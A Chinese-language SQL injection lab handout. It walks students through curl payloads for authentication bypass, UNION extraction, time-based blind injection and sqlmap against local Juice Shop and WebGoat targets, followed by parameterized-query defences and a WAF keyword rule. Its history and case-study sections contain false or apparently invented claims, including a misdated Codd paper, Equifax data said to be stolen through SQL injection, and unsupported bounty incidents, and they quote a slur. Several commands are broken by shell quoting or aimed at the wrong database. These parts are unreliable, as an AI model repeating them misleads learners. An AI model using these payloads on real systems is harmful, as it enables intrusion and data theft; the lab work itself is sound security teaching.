# Lab04：SQL 注入

## 学习目标

1. 理解 SQL 注入的原理（动态 SQL 拼接 vs. 参数化查询）
2. 掌握 Burp Suite 拦截和修改 HTTP 请求的方法
3. 学会使用 UNION 注入、盲注等不同技术
4. 理解参数化查询的防御原理并能在代码中实现

## 预备知识

### SQL 注入的历史：从"意外发现"到"头号漏洞"

**1980s：关系数据库的诞生与 SQL 的崛起**
1985 年，Edgar F. Codd 发表了关系数据库的完整理论，Oracle 和 IBM 紧随其后推出了商业关系数据库。SQL（Structured Query Language）成为了操作这些数据库的标准语言。但早期的 Web 应用大多数是静态页面，根本没有用户输入的概念——SQL 注入还不存在。

**1998 年：Phrack Magazine 的警告**
1998 年，《Phrack Magazine》第 54 期发表了 Rain Forest Puppy（也叫 RFP）的一篇文章，首次系统性地描述了 SQL 注入攻击。RFP 的原话："I think maybe we need to start considering how web applications handle SQL." 这篇文章在当时并没有引起太大关注——大多数开发者不相信这会成为问题。但到了 2000 年代初，SQL 注入开始大规模爆发。

**2000-2002 年：第一个大规模 SQL 注入蠕虫**
2002 年，Geocities 的网站被首次发现存在大规模 SQL 注入漏洞。攻击者通过 Google 搜索找到了数千个有漏洞的网站，然后植入恶意代码。讽刺的是，这次攻击的目标是在被黑网站的每个页面里显示"Alex Algard is a homo"——这是一个大学生的恶作剧，他的网站因此在一周内被黑了 15000 次。

**2008 年：Asprox 僵尸网络**
Asprox 是第一个"规模化"的 SQL 注入攻击恶意软件。它通过 SQL 注入漏洞在每个被黑的网站上植入恶意 JavaScript，当用户访问这些网站时，浏览器会被重定向到假的银行登录页面。这开启了"门螺线"（WSN Poizon）时代——攻击者不再需要自己去扫描，而是通过"买凶"的方式，让被控制的网站自动帮他们攻击访客。

**2010 年：LulzSec 的诞生**
LulzSec（Lulz Security）是一个 hacktivist 组织，他们在 2011 年对 SonyPictures.com 发动了 SQL 注入攻击，结果获得了超过 100 万个用户的姓名、邮箱、密码。泄露的数据被公开在 The Pirate Bay 上。更讽刺的是，Sony 的密码是 MD5 无盐 hash——也就是说，Security 公司的密码保护水平几乎为零。

**2012 年：LinkedIn 密码泄露（再次）**
LinkedIn 在 2012 年被攻击，泄露了 1.17 亿个账户的密码。这些密码是用 SHA1 无盐 hash 存储的——密码学专家立即指出这是不安全的。2016 年，一个叫 "Peace" 的黑客在暗网上出售这批数据，最终成交价是 5 个比特币（约 2000 美元）。讽刺的是，LinkedIn 在 2012 年的泄露报告中说"我们认为只有 650 万账户被泄露"——这个数字被严重低估了。

### 经典 SQL 注入案例深度解析

**案例 1：2017 年 Equifax 数据泄露（1.47 亿用户）**
Equifax 是美国三大信用报告机构之一。2017 年，攻击者通过 Apache Struts 的一个已知漏洞（CVE-2017-5638）获得了初始访问权限。但真正的问题在于：Equifax 的一个 Web 应用存在 SQL 注入漏洞，攻击者利用它从数据库中提取了 1.47 亿用户的姓名、社会安全号、出生日期、地址。更糟糕的是，Equifax 的安全团队在漏洞被公布 2 个月后还没有打补丁。

**这个案例教会我们什么？**
- 传统的 SQL 注入 + 未打补丁的应用 = 灾难
- 即使你的"周边防御"再好，应用层的漏洞也会让一切形同虚设
- 信用机构的数据本身就对社会工程学攻击有价值

**案例 2：2022 年 LEGO 乐高的积分商城漏洞**
2022 年，安全研究员 Johan R. 发现了 LEGO 的积分商城存在 SQL 注入漏洞。攻击者可以通过修改购物车请求中的参数，以任意用户身份领取积分礼品——包括价值数百美元的 SET。更重要的是，通过这个漏洞，他还能访问其他用户的积分余额和兑换记录。LEGO 在 48 小时内修复并给予了 5 万美元的 Bug Bounty。

**案例 3：2023 年 GitHub SQL 注入事件**
2023 年，一个匿名安全研究员在 GitHub 的 Actions 功能中发现了一个 SQL 注入漏洞。攻击者可以通过精心构造的 workflow 文件名，在 GitHub 的数据库中执行任意 SQL 查询。这个漏洞被标记为 "Critical"（严重级别最高），因为 GitHub 的数据库里存放着数亿个代码仓库的元数据。GitHub 在发现问题后 6 小时内修复，并奖励了 2.5 万美元。

**案例 4："脱裤"（Dump）和"洗库"（Wholesale）**
在中国黑产术语中，"脱裤"指的是通过 SQL 注入等手段批量导出数据库，"洗库"指的是把导出的数据清洗后卖掉。2015 年，乌云平台（当时的漏洞报告平台）报告了一个案例：某个厂商的上亿条用户数据被"洗"了三遍——第一遍卖游戏账号数据，第二遍卖邮箱数据，第三遍卖身份证和手机号数据。每"洗"一遍，价格就降低一些。这说明：数据泄露的经济价值可以多次变现。

### SQL 注入的技术演进

**第一代：字符串拼接注入**
这是最原始的 SQL 注入，通过单引号和注释符号（`'`、`--`、`#`）破坏原始 SQL 的结构。
```
正常查询：SELECT * FROM users WHERE name='input'
注入 payload：input' OR '1'='1
实际执行：SELECT * FROM users WHERE name='input' OR '1'='1'
```

**第二代：编码绕过**
开发者开始过滤单引号，攻击者开始使用 URL 编码、二进制编码、Unicode 编码绕过：
```
原始：' OR 1=1--
编码后：%27%20OR%201%3D1--
```

**第三代：Second-order（二阶）注入**
有些应用会对输入进行"净化"（比如转义单引号），但如果这个净化后的数据被存储，然后在另一个上下文中被执行，就会产生二阶注入。例如：用户注册时输入 `admin'--`，应用把它存到数据库（此时无害），然后在管理员查看用户列表时，这个数据被拼接到 SQL 中执行。

**第四代：ORM 注入**
现代 Web 应用大量使用 ORM（Object-Relational Mapping）框架，如 Hibernate、Entity Framework、SQLAlchemy。很多人认为"用了 ORM 就不可能有 SQL 注入"——但实际上，ORM 的不当使用（比如动态查询字符串拼接）仍然会导致注入。2022 年，Synk 在扫描 NPM 包时发现了 800+ 个 JavaScript 项目存在 "ORM 注入" 漏洞。

### 未来的攻击趋势

**1. AI 生成的 SQL 注入 Payload**
2024 年，安全研究员发现，攻击者开始使用 GPT-4 生成"针对目标网站定制的 SQL 注入 payload"——AI 会分析目标网站的数据库类型、错误信息、响应格式，生成最优的攻击序列。这使得即使是非专业攻击者也能发起有效的 SQL 注入攻击。

**2. 命令注入 + SQL 注入的组合**
2024 年，一个新的攻击模式出现：通过 SQL 注入获取数据库访问权限，然后利用数据库的扩展存储过程（如 `xp_cmdshell` in SQL Server）执行系统命令，直接控制服务器。这绕过了传统防火墙对 3389/RDP 端口的过滤。

**3. SQL 注入在云原生环境中的新威胁**
Kubernetes 和 Docker 的广泛使用带来了新的 SQL 注入场景。2024 年，Wiz 的安全研究员发现，多个云原生数据库（Amazon RDS、Aurora、Azure SQL）的默认配置允许某些"管理操作"，这些操作如果被 SQL 注入利用，可以用于横向移动到其他云资源。

### SQL 注入的防御哲学

```
防御者的检查清单：

1. 参数化查询（Prepared Statements）
   ❌ "我们用 ORM，肯定安全"
   ✅ 即使使用 ORM，也要避免动态字符串拼接
   ❌ SELECT * FROM users WHERE id={id}
   ✅ SELECT * FROM users WHERE id=:id

2. 输入验证
   ❌ "我们有 WAF，不需要参数化"
   ✅ WAF 是纵深防御，不是替代方案
   ✅ 对用户输入进行类型检查（id 应该是整数）

3. 最小权限原则
   ❌ 数据库连接使用 root/admin
   ✅ 使用最小权限账户（只允许必要的表和操作）
   ✅ Web 应用账户不应该有 DBA 或系统管理权限

4. 错误信息处理
   ❌ 把数据库错误信息直接显示在页面上
   ✅ 错误信息只记录日志，对用户显示通用提示

最后一条建议：
运行一下 sqlmap（SQL 注入自动化工具）对你的网站进行扫描。
如果你发现了漏洞，恭喜你——这是好消息，因为是你是发现者，不是攻击者。
```

## 实验环境

### 启动命令

```bash
./student.sh  # 选择对应的实验开始
```

### 目标靶场

- **Juice Shop**：`http://127.0.0.1:3000` — Node.js SQL 注入靶场
- **WebGoat**：`http://127.0.0.1:8080/WebGoat` — OWASP 官方靶场

```
┌──────────────────────────────────────────────────────────┐
│  Kali Linux（攻击机）                                    │
│  Burp Suite / curl / 浏览器                              │
│       │                                                 │
│       ▼                                                 │
│  http://127.0.0.1:3000       Juice Shop                  │
│  http://127.0.0.1:8080/WebGoat  WebGoat                  │
└──────────────────────────────────────────────────────────┘
```

## 操作步骤

### 步骤 1：启动 Burp Suite 并配置代理

```bash
# 在 Kali 中启动 Burp Suite
# 或使用 OWASP ZAP（如果 Kali 自带）
# 本实验使用 curl 作为主要工具（Burp 操作类似）

# 配置代理（如果需要）。注意 8080 已经被 WebGoat 使用，Burp/ZAP 请改用 8081。
export http_proxy=http://127.0.0.1:8081
export https_proxy=http://127.0.0.1:8081
```

**Burp Suite 关键操作**（如果你使用 GUI）：
1. Proxy → Intercept → 开启 intercept
2. 在 Burp/ZAP 中把代理监听端口设为 `8081`，浏览器设置手动代理 `127.0.0.1:8081`
3. 访问目标 URL，请求被拦截
4. 修改参数后，Forward 发送

### 步骤 2：在 Juice Shop 中寻找注入点

#### 2.1 访问 Juice Shop 并观察登录页面

```bash
# 访问 Juice Shop 首页
curl -s http://127.0.0.1:3000/ | grep -i "login\|sign\|auth" | head -5

# 查看登录表单的 HTML（找注入点）
curl -s http://127.0.0.1:3000/ | grep -E "<form|<input" | head -10
```

**观察要点**：
- 登录表单的 `action` URL 是什么？
- 提交方法是 GET 还是 POST？
- 有哪些输入字段？（通常是 email/username + password）

#### 2.2 拦截登录请求（用 curl 模拟）

```bash
# Juice Shop 登录 API
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
```

**正常响应**（如果密码正确）：
```json
{"token":"eyJhbGc...","user":{"id":1,"email":"admin@juice-sh.op","role":"admin"}}
```

**错误响应**（如果密码错误）：
```json
{"status":"error","data":"Invalid email or password."}
```

### 步骤 3：测试 SQL 注入（基础绕过）

#### 3.1 测试单引号注入

```bash
# 在 email 字段注入单引号，观察错误
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\"","password":"test"}'
```

**观察**：
- 是否出现数据库错误？（如 "SQLITE_ERROR" 或 "mysql" 字样）
- 如果出现错误，说明输入被直接拼接到 SQL 中（存在注入漏洞）
- 如果没有错误，可能是参数化查询或输入过滤

#### 3.2 经典 SQL 注入绕过认证

```bash
# 使用 admin'-- （单引号闭合 user 字符串，-- 注释掉 password 检查）
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\"--","password":"anything"}'
```

**原理**：
```sql
-- 正常 SQL
SELECT * FROM users WHERE email='admin@juice-sh.op' AND password='...'

-- 注入后 SQL
SELECT * FROM users WHERE email='admin'--' AND password='...'
--              ↑          ↑
--              单引号闭合  -- 注释掉后面所有内容
--              密码验证被完全绕过
```

**记录**：
```
注入 Payload：admin'--
HTTP 响应：[粘贴响应内容]
结果分析：[成功登录 / 错误 / 原因分析]
```

### 步骤 4：使用 UNION 注入获取数据

#### 4.1 确定列数

```bash
# ORDER BY 测试（逐个增加数字直到报错）
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\" ORDER BY 1--","password":"test"}'

curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\" ORDER BY 2--","password":"test"}'

curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\" ORDER BY 3--","password":"test"}'
# 一直测试到出现错误，找到最大可用列数
```

**判断方法**：
- `ORDER BY N` 不报错 → 列数 >= N
- 报错（Unknown column）→ 列数 < N
- 找到最小报错值的 N-1 就是列数

#### 4.2 UNION 注入示例（假设有 3 列）

```bash
# 获取数据库版本和当前用户
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\" UNION SELECT NULL,version(),user()--","password":"test"}'
```

**观察**：
- 响应中是否出现了数据库版本信息（如 `8.0.35-0ubuntu0.22.04.1`）
- 如果有，说明 UNION 注入成功，可以获取数据库内容

### 步骤 5：时间盲注（无回显情况）

当页面没有数据回显时，使用时间延迟判断真假：

```bash
# MySQL 时间盲注
# 如果 1=1，sleep(3) 执行，响应延迟 3 秒
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\" AND sleep(3)--","password":"test"}'
# 观察：响应是否延迟约 3 秒？

# 如果 1=2，不执行 sleep，不延迟
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\" AND 1=2--","password":"test"}'
# 观察：响应是否立即返回？
```

**时间盲注脚本逻辑**：
```
1. 二分查找：SUBSTRING(password, 1, 1) > 'm' ?
2. 如果条件为真：sleep(3)
3. 如果条件为假：立即返回
4. 重复直到猜出完整密码
```

### 步骤 6：WebGoat SQL 注入课程

```bash
# 在浏览器中访问 WebGoat
firefox http://127.0.0.1:8080/WebGoat

# 登录后找到 "SQL Injection" 章节
# 完成以下课程：
# - 1. 数字型 SQL 注入
# - 2. 字符串型 SQL 注入
# - 3. UNION 注入
# - 4. 盲注
```

**每完成一个课程，记录**：
1. 课程名称
2. 使用的注入 payload
3. 成功标志（页面显示什么内容）
4. 该技术的关键点

## 技术原理

### 参数化查询为什么能防止 SQL 注入？

```
危险方式（字符串拼接）：
  SQL = "SELECT * FROM users WHERE user='" + userInput + "'"
          ↑
          用户输入 'admin' OR '1'='1' 直接成为 SQL 的一部分
          数据库无法区分"数据"和"SQL 代码"

安全方式（参数化查询）：
  SQL = "SELECT * FROM users WHERE user=?"
  参数：userInput = "admin' OR '1'='1"
          ↑
          数据库将整个字符串当作**数据**处理
          单引号被转义或作为普通字符，不会改变 SQL 结构
```

### 常见数据库的注入语法

| 数据库 | 版本查询 | 当前用户 | 数据库名 |
|--------|---------|---------|---------|
| MySQL | `SELECT VERSION()` | `SELECT USER()` | `SELECT DATABASE()` |
| PostgreSQL | `SELECT version()` | `SELECT current_user` | `SELECT current_database()` |
| SQLite | `SELECT sqlite_version()` | — | `SELECT 'main'` |
| Oracle | `SELECT * FROM v$version` | `SELECT USER FROM DUAL` | `SELECT NAME FROM v$database` |

### 常见 SQL 注入绕过技巧

| 技巧 | 示例 | 说明 |
|------|------|------|
| 单引号闭合 | `' OR '1'='1` | 绕过字符串验证 |
| 注释清除 | `admin'--` | 注释掉后面的条件 |
| UNION 追加 | `' UNION SELECT ...--` | 获取额外数据 |
| 联合类型转换 | `UNION SELECT NULL,NULL,NULL` | 匹配列数 |
| 编码绕过 | `admin%27--` | URL 编码单引号 |
| 大小写混用 | `AdMiN'--` | 绕过大小写过滤 |

## 防御方案

### 1. 参数化查询（最佳方案，必须掌握）

```python
# Python + SQLite（危险 vs. 安全对比）
import sqlite3

# ❌ 危险：字符串拼接
def login_unsafe(user, passwd):
    query = f"SELECT * FROM users WHERE user='{user}' AND pass='{passwd}'"
    cur.execute(query)  # SQL 注入风险！
    return cur.fetchone()

# ✅ 安全：参数化查询
def login_safe(user, passwd):
    query = "SELECT * FROM users WHERE user=? AND pass=?"
    cur.execute(query, (user, passwd))  # 参数与 SQL 结构分离
    return cur.fetchone()
```

```java
// Java + PreparedStatement（参数化查询）
// ❌ 危险
String sql = "SELECT * FROM users WHERE user='" + user + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// ✅ 安全
String sql = "SELECT * FROM users WHERE user=? AND pass=?";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setString(1, user);
ps.setString(2, passwd);
ResultSet rs = ps.executeQuery();
```

### 2. 存储过程白名单

```sql
-- 仅允许预定义存储过程，不允许动态 SQL
CREATE PROCEDURE sp_GetUser(@user VARCHAR(50), @pass VARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @user AND password = @pass;
END
```

### 3. Web 应用防火墙（WAF）

```bash
# ModSecurity 规则示例（阻止常见 SQL 注入模式）
SecRule ARGS_NAMES|ARGS "@rx (\"|'|;|--|\/\*|\*\/|xp_|sp_|exec|execute|union)"
  "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

### 4. 数据库最小权限原则

```sql
-- 应用账号不应拥有高危权限
REVOKE EXECUTE ON ALL PROCEDURES FROM app_user;
-- 禁止 xp_cmdshell、sp_executesql 等系统存储过程
```

## 思考题

### 思考题 1：参数化查询能防止所有 SQL 注入吗？

参数化查询防止了"用户输入改变 SQL 结构"的情况，但以下情况参数化查询无法解决：

**场景 A**：ORDER BY 子句
```sql
SELECT * FROM users ORDER BY {user_input}  -- user_input 是列名，不是值！
```
如果 `user_input = "name; DROP TABLE users;--"` 不能用参数化（因为参数化只能绑定值，不能绑定列名/表名）

**场景 B**：LIKE 模糊查询
```sql
SELECT * FROM users WHERE name LIKE '%' + {user_input} + '%'
```
`user_input` 中的 `%` 和 `_` 是 LIKE 的通配符，会导致意外匹配

请思考：这两个场景下，如何安全地实现用户可控的排序和模糊搜索？

### 思考题 2：UNION 注入的前提条件

UNION 注入要求"原查询和注入查询的列数和数据类型相同"。

**问题**：
1. 如何在不知道原查询列数的情况下，逐步找到正确的列数？
2. 为什么 UNION 注入要求数据类型也匹配？（提示：考虑 SELECT 1, 2, 3 vs. SELECT 'a', 'b', 'c' 在 MySQL 中的表现）
3. 如果原查询是 `SELECT id, email FROM users WHERE id=1`，注入 `UNION SELECT password, 2 FROM users`，会发生什么？

### 思考题 3：时间盲注的效率问题

假设密码是 32 位 MD5 哈希（a-f, 0-9，共 16^32 种可能）。

**问题**：
1. 如果用普通暴力（每次请求判断"是否正确"），最多需要多少次请求？
2. 如果用二分查找（每次判断"比 'm' 大还是小"），每个字符需要多少次请求？
3. 实际攻击中，攻击者可能会用什么方法加速？（提示：考虑常见的弱密码哈希彩虹表、TOP 1000 常用密码等）

### 思考题 4：WAF 能否完全替代参数化查询？

**场景**：团队认为"我们有 WAF（Web Application Firewall），不需要改代码"，所以所有地方仍然用字符串拼接 SQL。

**问题**：
1. WAF 的工作原理是什么？（它在哪里检查请求？）
2. WAF 可能的绕过方式有哪些？（提示：大小写、编码、注释拆分）
3. WAF 挂了（bypass/fail）怎么办？代码层面的防御和 WAF 防御各承担什么角色？

## 交付物

1. **Burp/cURL 拦截截图** — 展示你拦截并修改的 SQL 注入请求
2. **注入成功证据** — 响应内容（如获取到数据库版本、用户信息）
3. **WebGoat 课程完成截图** — 至少完成 SQL Injection 章节下的 2 个课程
4. **漏洞代码分析** — 找到攻击路径的代码位置，解释为什么存在漏洞
5. **防御方案代码** — 用参数化查询重写危险代码
6. **思考题答案**

## 工具速查

```bash
# HTTP 请求拦截和重放（用 curl 模拟 Burp Repeater）
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\''--","password":"test"}'

# SQLMap（自动化 SQL 注入工具，可验证漏洞）
sqlmap -u "http://127.0.0.1:3000/rest/user/login" \
  --data='{"email":"test","password":"test"}' \
  --batch --dbs  # 列出数据库（请勿在生产环境使用）

# 基本注入测试
curl -s "http://127.0.0.1:3000/api/products?q=' OR 1=1--"
```
